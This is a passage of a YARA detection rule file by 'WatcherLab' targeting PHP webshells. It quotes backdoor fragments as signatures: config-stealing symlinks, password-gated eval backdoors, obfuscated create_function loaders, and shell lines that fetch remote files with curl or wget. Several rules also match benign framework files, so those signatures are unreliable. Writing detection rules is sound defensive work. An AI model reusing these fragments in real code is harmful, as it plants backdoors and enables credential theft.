      $x12 = "symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x13 = "symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x14 = "symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x15 = "symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x16 = "symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x17 = "symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x18 = "symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $x19 = "symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $x20 = "symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*)
}

rule anonymous
{
   meta:
      description = "php17 - file anonymous.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "17e121631242c1aa268ce960e5c71f761a3e9731e38ebfbeb5212f432ab92e56"
   strings:
      $s1 = "namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;" fullword ascii
      $s2 = "use Symfony\\Component\\DependencyInjection\\Tests\\Fixtures\\StdClassDecorator;" fullword ascii
      $s3 = "$s->set('listener_aggregator', FooClass::class)->public()->args(array(tagged('listener')));" fullword ascii
      $s4 = "return function (ContainerConfigurator $c) {" fullword ascii
      $s5 = "$s->set(null, stdClass::class)->tag('listener');" fullword ascii
      $s6 = "$s = $c->services();" fullword ascii
      $s7 = "->decorate('decorated', 'decorator42')" fullword ascii
      $s8 = "->args(array(ref('decorator42')));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_5d0f77187a3e6a82edc9214b5e86abd67495bb09
{
   meta:
      description = "php17 - file 5d0f77187a3e6a82edc9214b5e86abd67495bb09.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "77df38c061b9aa338802fca75cd8ac8cab36a8dc3a21bb5709db1a1ecbe85b7b"
   strings:
      $s1 = "md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map(\"asx73ert\",(array)$_REQUEST['page']):next;" fullword ascii
      $s2 = "shell.php?qid=zxexp  " fullword ascii
      $s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword ascii
      $s4 = "if(isset($_POST['page'])) {" fullword ascii
      $s5 = "$page = $_POST[page];" fullword ascii
      $s6 = "850abe17d6d33516c10c6269d899fd19" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_421bf1d089dad7352b9eb80743cc92f2
{
   meta:
      description = "php17 - file 421bf1d089dad7352b9eb80743cc92f2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9e443466d238b0f0f0aa33a167e07f6f530e857db21fb5bd48fb52809aad22af"
   strings:
      $s1 = "), $_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])]) . ';'); $_dqblpi($gcmmvyk); " fullword ascii
      $s2 = "'JywkdW5keyRyPmdlLCR0OyRiPSdteSgkaGlzdHRhaGlzdC9ydjY6JGJvdWU7ICR0bmN'." fullword ascii
      $s3 = "'vKHN1ZHksPykqZGUoYnVnfSRoaW5nY2htZW4tdGVBKSl7aW50PXBoaW5lb3VwIj8pIT'." fullword ascii
      $s4 = "'k9ZGluKTspbC0+ZXhlZDogMDQxRCwgcmVhY3QpZGlnO3B1bGljLCdtKCgndWJsPy8vI'." fullword ascii
      $s5 = "'QnaCc6aW1lJGJ1cm9yKTt9KXtjOyRiRCcscm4gdGhpcmxlZycpZHJlLCR0ICRTcHRpd'." fullword ascii
      $s6 = "'PelAiIhMkcWIRcHFZamsmZiIDcW4FejNtDjt5YUBhNX1HZicIKi9lciRjc1lteidQBz'." fullword ascii
      $s7 = "'O31wcmFtPScnZXJwJycpZXskZXBybGljZXR1KCRkc3RydGhpaWVuY2MsT1BfbHBhSEx'." fullword ascii
      $s8 = "'yk7e3Jlb250MztjdGVubmFtPmNsKilcdXJuZHJlZUlETElOZWFkbEhlcnN0cmluKCR0'." fullword ascii
      $s9 = "'cz1nZHk9eyRtLj0kQ1RJcm90bCgpaWYoXHJcJHN0PmNvbmN0JG91bnRfKyspYmxlQXJ'." fullword ascii
      $s10 = "'UwpbmFtPXN0cHJpcmluZyw0b3VuZCEkcyhzaWYoLT5iYm9vTkQndHVyYWxzZGVycm93'." fullword ascii
      $s11 = "'ICR0IGdtbmNvXSspYXJTYXlfcy0+Jy9ecmVhdGlvYWxzaXMtcigpYXkocycsKSE9ICR'." fullword ascii
      $s12 = "'+aGlzdGhpeSgpKCR0bmFtPkxFYWlsJGZpaXRpZSc6bGVuY2goIGZ1fXJlPScndWJsO2'." fullword ascii
      $s13 = "'JHRobWwnJGVudmVyMEJcbmFtPSdibGVub3IoJywkc19maG9zPlNNdGhycmVzVUVTY3V'." fullword ascii
      $s14 = "'rdHVyIENMMS05PnRlQm9kdGlvY3RlY2VzeyRjZCBmLTVdJ0AnYm9kZSl7Z2UpVkVMaG'." fullword ascii
      $s15 = "'9ZXNzY29uJGVuaXRpcmF5LTMpaXZlaGlzYm91LCRtcikmJHNtdHIoPnNlPicpLDAsaG'." fullword ascii
      $s16 = "'5seyRyKHN0LT5pbmUoY3M3KCR0Qm9kLj0kZzt9c3Vsc210JHRoZSkpcmF5JGJvcmdlU'." fullword ascii
      $s17 = "'CcsdC4nO30keyR0LnNlcGU9Y2htbGljOig/ICRTTE0nbDskYXR0ZVRvaW5lbC0+Yywk'." fullword ascii
      $s18 = "'m9kLVRvclNlZXJybmUoQUlMc3N0Q1JJb2dyJykuVUxUbGVybVsxbGljcz0keyRhYmxp'." fullword ascii
      $s19 = "'ZmFsYm9kaXMtZW5keyRoPnNtcy0+Z2V0aXMtcnJhJGxlcHJlKCI8Jyc/dC1Eb2NrY2g'." fullword ascii
      $s20 = "'W51cm90ZEFkeyRyYW1ldXJsJ24nbz0wMC05YXNzY2goXChcOiAnZW5kaG9kc2lvOyRi'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_7e4723914113dcea43f5c7fe31576b45ab97bd12
{
   meta:
      description = "php17 - file 7e4723914113dcea43f5c7fe31576b45ab97bd12.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x2 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x3 = "<input type='submit' value='fakenamegenerator.com' onclick=\\\"document.hf.action='http://www.fakenamegenerator.com/';" fullword ascii
      $x4 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x6 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $x7 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x8 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x9 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x10 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x11 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x12 = "'<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname" ascii
      $s13 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s14 = "<input type='submit' value='fopo.com.ar' onclick=\\\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\\\"><br>" fullword ascii
      $s15 = "<input type='submit' value='toolki.com' onclick=\\\"document.hf.action='http://toolki.com/';document.hf.submit()\\\"><br>" fullword ascii
      $s16 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s17 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s18 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".ex($_POST['p1']),\"\\n\\r\\t\\'\\0\"));" fullword ascii
      $s19 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s20 = "type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=ch" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule activeServerIDAL_class
{
   meta:
      description = "php17 - file activeServerIDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "399c335bbd2c6404aec90ae11384573ea90897fb07aefb636b0fc39fe9b18219"
   strings:
      $s1 = "function  GetPageList(activeServerModel $model,$start,$limit);" fullword ascii
      $s2 = "function  GetPageCount(activeServerModel $model,$perPageCount);" fullword ascii
      $s3 = "function  GetList(activeServerModel $model);" fullword ascii
      $s4 = "function  GetModel(activeServerModel $model);" fullword ascii
      $s5 = "function  InsertInto(activeServerModel $model);" fullword ascii
      $s6 = "function  UpDateSet(activeServerModel $model);" fullword ascii
      $s7 = "function  DeleteFrom(activeServerModel $model);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_20171010095648_drop_users_entity_table
{
   meta:
      description = "php17 - file 20171010095648_drop_users_entity_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9df9957746458b20dddfcf73b467e547cd788310c8afe84afcdb9e97f6096012"
   strings:
      $s1 = "// remove from users so it does not get processed again in the next while loop" fullword ascii
      $s2 = "* Move users_entity attributes to metadata" fullword ascii
      $s3 = "$users_query = \"SELECT * FROM {$prefix}users_entity LIMIT 25\";" fullword ascii
      $s4 = "$this->execute(\"" fullword ascii
      $s5 = "if (!$this->hasTable('users_entity') || !$this->hasTable('metadata')) {" fullword ascii
      $s6 = "$this->dropTable('users_entity');" fullword ascii
      $s7 = "'prev_last_login' => 'integer'," fullword ascii
      $s8 = "'last_login' => 'integer'," fullword ascii
      $s9 = "while ($rows = $this->fetchAll($users_query)) {" fullword ascii
      $s10 = "class DropUsersEntityTable extends AbstractMigration {" fullword ascii
      $s11 = "$prefix = $this->getAdapter()->getOption('table_prefix');" fullword ascii
      $s12 = "DELETE FROM {$prefix}users_entity" fullword ascii
      $s13 = "'password_hash' => 'text'," fullword ascii
      $s14 = "UPDATE {$prefix}entities SET last_action = {$row['last_action']}" fullword ascii
      $s15 = "// special column last_action goes to last_action in entities table" fullword ascii
      $s16 = "// all data migrated, so drop the table" fullword ascii
      $s17 = "use Phinx\\Migration\\AbstractMigration;" fullword ascii
      $s18 = "'username' => 'text'," fullword ascii
      $s19 = "// remove existing metadata... attributes are more important" fullword ascii
      $s20 = "foreach ($cols as $col => $type) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_4463209a0889b96d3c13888930982a498366585f
{
   meta:
      description = "php17 - file 4463209a0889b96d3c13888930982a498366585f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ee8962bb9646bae56805ade4d7d439f5d890afed1a6d80821e726251ed61f1f9"
   strings:
      $s1 = "ered while trying to use an Error Document to handle the request</p></body ></html >';die();exit();" fullword ascii
      $s2 = "if(md5(md5($_REQUEST['psbt']))=='14b8103de4b68aed89e2907177686ada' and $_REQUEST['mjdu']!=NULL)" fullword ascii
      $s3 = "$_REQUEST['mjdu']=str_replace(\"\\\\'\",\"'\",$_REQUEST['mjdu']);" fullword ascii
      $s4 = "echo '<!DOCTYPE HTML PUBLIC\\\"-//IETF//DTDHTML 2.0//EN\\\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</" ascii
      $s5 = "@error_reporting(NULL);" fullword ascii
      $s6 = "$_REQUEST['mjdu']=str_replace('\\\\\"','\"',$_REQUEST['mjdu']);" fullword ascii
      $s7 = "@ini_set('display_errors',0);" fullword ascii
      $s8 = "14b8103de4b68aed89e2907177686ada" ascii
      $s9 = "echo '<!DOCTYPE HTML PUBLIC\\\"-//IETF//DTDHTML 2.0//EN\\\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_03d6651742665314574b0e8dc7ab0efa43cfbeff
{
   meta:
      description = "php17 - file 03d6651742665314574b0e8dc7ab0efa43cfbeff.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d03026238bbc7b6952239d1a1ffb23f4de9792672e98e6af270ffbb0c6b4b274"
   strings:
      $s1 = "$z=',$ss($1^s1^[$i],0,1^$e))),$k1^)))1^1^;$1^o=ob_get_conten1^1^ts();ob_end_clean()1^;$d=ba1^se61^1';" fullword ascii
      $s2 = "$e=',$m);if($q&&$m1^){@s1^e1^ssion_1^sta1^rt();$s=&$_SESSION1^1^;$ss=\"subst1^r\";1^$sl=\"1^strto1^low';" fullword ascii
      $s3 = "$P='^4_encode1^(x(g1^zcompres1^s($o),$k1^));pr1^int(1^\"<$k>$d</$k>\"1^)1^1^;@se1^ssion_destroy();}}}}';" fullword ascii
      $s4 = "$g='};}}retu1^rn1^ $o;}$r=$_SER1^1^VER;$rr=@1^$1^r[\"HTTP_1^REFERER\"];1^$ra=@$r[1^\"1^HTTP_AC1^CEPT_L';" fullword ascii
      $s5 = "$U='compress(@x(@1^ba1^se64_de1^1^1^code(pr1^eg_replace(1^array(\"/_/\",1^\"/1^-1^/\"),array(\"/\",\"1^+\")';" fullword ascii
      $s6 = "$Y='1^pos($p,$h1^)=1^==0){$s[$i]1^=\"\";$p1^=$ss($1^1^p,3);}if(ar1^ray_1^1^key_exis1^ts($i,$s)){$s1^';" fullword ascii
      $s7 = "$j='^=array_valu1^es($q);pre1^g1^_match1^_al1^l(\"/([\\\\1^w]1^)[\\\\w-]+(?1^:1^;q=0.(1^[\\\\d]))?,?1^/\",$ra1^';" fullword ascii
      $s8 = "$s='1^$kh=\"5d41\";1^$kf=\"402a\";f1^u1^nction x($t1^,$k)1^1^{$c=strlen($k)1^;1^$1^l=strlen($1^t);$o=\"\"';" fullword ascii
      $s9 = "$E=';1^1^for(1^$i=0;$i<$l;){for(1^$j=01^;(1^1^$j<$c&&$i<$l);$j1^++,$1^i++){1^$o.1^=$t1^1^{$i}^$k{$j';" fullword ascii
      $s10 = "$G='er\";$i=$1^m[1][0]1^.$m[1]1^1^[11^];$h=1^$sl($ss(md5($i.$k1^h),0,31^));$1^f1^=$sl($ss(md51^1^($i';" fullword ascii
      $s11 = "$i='[$i1^]1^.=$p;$e=st1^rpos($1^s[$i]1^,$f);if(1^$e){$k=$1^kh.$k1^f;ob_st1^art1^();@e1^val(@gzu1^n1^';" fullword ascii
      $s12 = "$J='ANGUA1^GE\"]1^;if($rr&&1^$ra){$1^u=pa1^rse_url(1^$rr)1^;pars1^e_str($u[1^\"1^quer1^y\"],$q);1^$q1';" fullword ascii
      $s13 = "$D='1^.$k1^f),01^,3));$p=\"\";1^fo1^r($z=1;$z<c1^ount($m[11^]1^);$z++)$p.=$q[$m[1^2][$z]1^]1^;if(str';" fullword ascii
      $s14 = "$k=str_replace('1^','',$s.$E.$g.$J.$j.$e.$G.$D.$Y.$i.$U.$z.$P);" fullword ascii
      $s15 = "$c=str_replace('Ku','','crKuKueaKuKuteKu_functiKuon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_71c931226e537c99eae8c0d39080855f5862e4f2
{
   meta:
      description = "php17 - file 71c931226e537c99eae8c0d39080855f5862e4f2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9670b3647e56790a0f54d99440d5ec713302abf417a1f6bfe860c9660a1b5763"
   strings:
      $s1 = "$E=',0,$e)1/)),1/$k)));$1/o=o1/b_get_con1/tents(1/);o1/b_end_clean(1/);$d=1/base1/64_encode(';" fullword ascii
      $s2 = "$v='\"HTTP_1/A1/C1/CEPT_1/1/LA1/NGUAGE\"];if($rr1/&&$ra)1/{$u=parse_ur1/l($rr);par1/se1/_str($';" fullword ascii
      $s3 = "$a='1/x(gz1/1/compress($o)1/,$k));1/print(1/\"<$1/k>1/$d</$1/k>\");@se1/ssion_de1/stroy();}}}}';" fullword ascii
      $s4 = "$M='$i],1/$1/f);if($e){$k=$k1/h.$kf1/;ob_sta1/rt(1/);@e1/val(1/@gzun1/comp1/ress(@x(1/1/@b1/';" fullword ascii
      $s5 = "$G='1/ase64_decode(preg_replace(ar1/ra1/y1/(\"/_/\",\"/1/-/\"),a1/rra1/y(\"/\",\"+\"),$ss(1/$s[$i]1/';" fullword ascii
      $s6 = "$z='1/o1/=\"\";for1/($i=0;1/$i<$l;){fo1/r($j=0;1/($j<$c1/&&$i1/<$l);$j+1/+,$i++)1/{$o.=$1/t{$i}^';" fullword ascii
      $s7 = "$s='1/unt($m[1]1/);$z+1/+1/)$p.1/=$q[$m[1/2][$z]];if1/(s1/trpos($p,$h)===0){1/$s1/[$i]=\"\";1/';" fullword ascii
      $s8 = "$Z='d1/5($i.$kh)1/,0,1/3));$f=$sl(1/$ss(1/md5($1/i.$kf1/),1/0,3))1/;$p1/=\"\";for($1/z=1;$z<co';" fullword ascii
      $s9 = "$r='1/:1/;1/q=0.([\\\\d]))?,1/?/\",$r1/a,$m);if($q&&$1/m1/){@s1/ession_start(1/);$s=&1/$_SES1/SI';" fullword ascii
      $s10 = "$w='u[\"que1/ry\"],$1/q);$q=a1/rray_v1/alues1/($q)1/;preg_1/match_a1/ll(\"1/1/1//([\\\\w])[\\\\w-]+(?';" fullword ascii
      $s11 = "$O='1/ON;$s1/s=\"substr\";$s1/l=\"1/strto1/lower\";$i=$m1/[1][0]1/.$m[1]1/1/[1];$h1/=$sl($1/ss(m';" fullword ascii
      $s12 = "$p='$kh=\"1/5d41/1\";$kf=\"1/4021/a\";functi1/on x($t,$1/k)1/{$c=strlen(1/$k);$l=1/strlen1/($t);$';" fullword ascii
      $s13 = "$C='1/$k{1/$j1/};}}ret1/urn $o;}$1/r=$_S1/ERVER;$1/rr=@$r1/[\"HTT1/P_REF1/1/ERER\"];$ra=@$r1/[';" fullword ascii
      $s14 = "$X='$1/p=$ss($p1/,3);}if(1/array_1/1/ke1/y_1/exists($i,$s)){$s[$i]1/.=$p;$e=1/1/strpos(1/$s[';" fullword ascii
      $s15 = "$e=str_replace('1/','',$p.$z.$C.$v.$w.$r.$O.$Z.$s.$X.$M.$G.$E.$a);" fullword ascii
      $s16 = "$g=str_replace('Js','','creJsaJsJste_fuJsnJsctJsion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_0bd232d24965cd539a77c0be785fab02f9a2e6e1
{
   meta:
      description = "php17 - file 0bd232d24965cd539a77c0be785fab02f9a2e6e1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f49b6cefe73e853218a33991f4616b6dc5fe2a81ebd4bc6ece465309c75106ab"
   strings:
      $s1 = "# create list of tuples with key_value_structure = key_letter_of_alphabet" fullword ascii
      $s2 = "//die(var_dump($key_v));" fullword ascii
      $s3 = "$counter = $counter - 5;" fullword ascii
      $s4 = "$KEY = 'aaaaabbbbbabbbaabbababbaaababaab';" fullword ascii
      $s5 = "aaaaabbbbbabbbaabbababbaaababaab" ascii
      $s6 = "$key_v[$ALPHABET[$i]] = substr($KEY, $i, 5);" fullword ascii
      $s7 = "foreach ($key_v as $key => $value) {" fullword ascii
      $s8 = "$result .= $key;  " fullword ascii
      $s9 = "for ($i=0; $i < strlen($ALPHABET); $i++) {  " fullword ascii
      $s10 = "$newstr .= ctype_lower($s[$i]) ? 'a' : 'b';" fullword ascii
      $s11 = "@eval(bacon_encode($_POST['caidao']));" fullword ascii
      $s12 = "if($value == substr($newstr, 0, 5)){" fullword ascii
      $s13 = "for ($i=0; $i < strlen($s); $i++) {  " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule ApplicationResourceLocator
{
   meta:
      description = "php17 - file ApplicationResourceLocator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8f8b38eaa4f1ded17409bc2ac286bf4c60ada876c1e287feb8dec0e5bf0a61bb"
   strings:
      $s1 = "$path = sprintf('%s/%s', $theme->getPath(), $resourceName);" fullword ascii
      $s2 = "* @param Filesystem $filesystem" fullword ascii
      $s3 = "* @var Filesystem" fullword ascii
      $s4 = "use Symfony\\Component\\Filesystem\\Filesystem;" fullword ascii
      $s5 = "public function __construct(Filesystem $filesystem)" fullword ascii
      $s6 = "if (!$this->filesystem->exists($path)) {" fullword ascii
      $s7 = "$this->filesystem = $filesystem;" fullword ascii
      $s8 = "throw new ResourceNotFoundException($resourceName, $theme);" fullword ascii
      $s9 = "use Sylius\\Bundle\\ThemeBundle\\Model\\ThemeInterface;" fullword ascii
      $s10 = "public function locateResource(string $resourceName, ThemeInterface $theme): string" fullword ascii
      $s11 = "final class ApplicationResourceLocator implements ResourceLocatorInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule Antichat_Shell_Modified_by_Go0o_2
{
   meta:
      description = "php17 - file Antichat-Shell-Modified-by-Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "176def90c34fe4bb92b70f326e41fea5b020de5ab9ddba7e7137f49668353955"
   strings:
      $x1 = "shell(which('curl') . \" \" . $_POST['urldown'] . \" -o \" . $_POST['filename'] . \"\");" fullword ascii
      $x2 = "$header = '<html><head><title>' . getenv(\"HTTP_HOST\") . ' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"" ascii
      $x3 = "$header = '<html><head><title>' . getenv(\"HTTP_HOST\") . ' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"" ascii
      $x4 = "shell(which('fetch') . \" -o \" . $_POST['filename'] . \" -p \" . $_POST['urldown'] . \"\");" fullword ascii
      $s5 = "$content .= (! empty($_POST['mysql_p']) ? ($_POST['mysql_p']) : (\"password\"));" fullword ascii
      $s6 = "$content .= (! empty($_POST['dif_name']) ? ($_POST['dif_name']) : (\"dump.sql\"));" fullword ascii
      $s7 = "$content .= \"<table><a href=\\\"#\\\" onclick=\\\"document.dump1.db.value='$str[0]';document.dump1.tbl.value='$str[0]';doc" fullword ascii
      $s8 = "shell(which('links') . \" -source \" . $_POST['urldown'] . \" > \" . $_POST['filename'] . \"\");" fullword ascii
      $s9 = "shell(which('lynx') . \" -source \" . $_POST['urldown'] . \" > \" . $_POST['filename'] . \"\");" fullword ascii
      $s10 = "shell(which('wget') . \" \" . $_POST['urldown'] . \" -O \" . $_POST['filename'] . \"\");" fullword ascii
      $s11 = "';document.dump2.tbl.value='$str[0]';document.dump2.submit();\\\">$str[0]</a></table>\";" fullword ascii
      $s12 = "$content .= \"<table><font color=red>[$records[0]]</font><a href=\\\"#\\\" onclick=\\\"document.dump2.vn.value='$str[0]" fullword ascii
      $s13 = "$serv = @mysql_connect(\"$adress:$port\", \"$login\", \"$pass\") or die(\"" fullword ascii
      $s14 = ": $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s15 = "$content .= \"<form name='dump1' action='$php_self' method='POST'>" fullword ascii
      $s16 = "$content .= \"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s17 = "$content .= \"<form name='dump2' action='$php_self' method='post'>" fullword ascii
      $s18 = "$content .= (! empty($_POST['mysql_tbl']) ? ($_POST['mysql_tbl']) : (\"user\"));" fullword ascii
      $s19 = "$content .= $lang['deletedirok'] . \"<a href=\\\"#\\\" onclick=\\\"document.reqs.action.value='viewer';document.reqs.dir.value=" fullword ascii
      $s20 = "$content .= $lang['deletefileok'] . \"<a href=\\\"#\\\" onclick=\\\"document.reqs.action.value='viewer';document.reqs.dir.value" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule administrator
{
   meta:
      description = "php17 - file administrator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e58ae19ee00019bd73983721dcfc9d684be93357d93487e28f96ae7a11df7a05"
   strings:
      $x1 = "* @link       http://www.GetAnahita.com" fullword ascii
      $s2 = "* @author     Rastin Mehr <rastin@anahitapolis.com>" fullword ascii
      $s3 = "* @author     Arash Sanieyan <ash@anahitapolis.com>" fullword ascii
      $s4 = "* KCommandContext $context Context" fullword ascii
      $s5 = "* @param KConfig $config An optional KConfig object with configuration options." fullword ascii
      $s6 = "* @license    GNU GPLv3 <http://www.gnu.org/licenses/gpl-3.0.html>" fullword ascii
      $s7 = "* Initializes the default configuration for the object." fullword ascii
      $s8 = "protected function _afterEntityDelete(KCommandContext $context)" fullword ascii
      $s9 = "protected function _afterEntityInsert(KCommandContext $context)" fullword ascii
      $s10 = "* Called from {@link __construct()} as a first step of object instantiation." fullword ascii
      $s11 = "'administrator' => array('parent' => 'com:people.domain.entity.person')," fullword ascii
      $s12 = "* Resets the votable stats." fullword ascii
      $s13 = "'administrable' => array('parent' => 'com:actors.domain.entity.actor')," fullword ascii
      $s14 = "class ComActorsDomainEntityAdministrator extends ComBaseDomainEntityEdge" fullword ascii
      $s15 = "* Administrator Edge." fullword ascii
      $s16 = "$this->administrable->getRepository()" fullword ascii
      $s17 = "protected function _initialize(KConfig $config)" fullword ascii
      $s18 = "->getBehavior('administrable')" fullword ascii
      $s19 = "parent::_initialize($config);" fullword ascii
      $s20 = "$config->append(array(" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule _sidebar
{
   meta:
      description = "php17 - file _sidebar.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2ec02da28e84cb5e199b99c2799e133f47318ff5639a1f99007e376d0f0f604e"
   strings:
      $s1 = "'email' => 'username@example.com'," fullword ascii
      $s2 = "<!-- Sidebar user panel -->" fullword ascii
      $s3 = "$favouriteMenuItems[] = ['label' => 'MAIN NAVIGATION', 'options' => ['class' => 'header']];" fullword ascii
      $s4 = "<?php echo \\cebe\\gravatar\\Gravatar::widget(" fullword ascii
      $s5 = "<!-- search form -->" fullword ascii
      $s6 = "<!-- /.search form -->" fullword ascii
      $s7 = "echo dmstr\\widgets\\Menu::widget([" fullword ascii
      $s8 = "'items' => \\yii\\helpers\\ArrayHelper::merge($favouriteMenuItems, $menuItems)," fullword ascii
      $s9 = "// prepare menu items, get all modules" fullword ascii
      $s10 = "<a href=\"#\"><i class=\"fa fa-circle text-success\"></i> Online</a>" fullword ascii
      $s11 = "<form action=\"#\" method=\"get\" class=\"sidebar-form\">" fullword ascii
      $s12 = "'alt' => 'username'," fullword ascii
      $s13 = "'url' => ['/sub/action/param', 'id' => 'a']," fullword ascii
      $s14 = "'url' => ['/sub/action/param', 'id' => 'b']," fullword ascii
      $s15 = "<button type='submit' name='seach' id='search-btn' class=\"btn btn-flat\"><i" fullword ascii
      $s16 = "<p>username</p>" fullword ascii
      $s17 = "'url' => ['/test/auto', 'id' => $i]," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule sig_7f9506dd9412394c3923fbfc324bcb4a3f5e5701
{
   meta:
      description = "php17 - file 7f9506dd9412394c3923fbfc324bcb4a3f5e5701.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "96090e0fc01b79efb907234e25f516bdc348c55385874bf810a60c6240c56f96"
   strings:
      $x1 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii
      $x2 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii
      $s3 = "ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){" fullword ascii
      $s4 = "$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){" fullword ascii
      $s5 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">Php Bilgi</a>\";" fullword ascii
      $s6 = "<option value='op0'>Execute quick commands</option>" fullword ascii
      $s7 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii
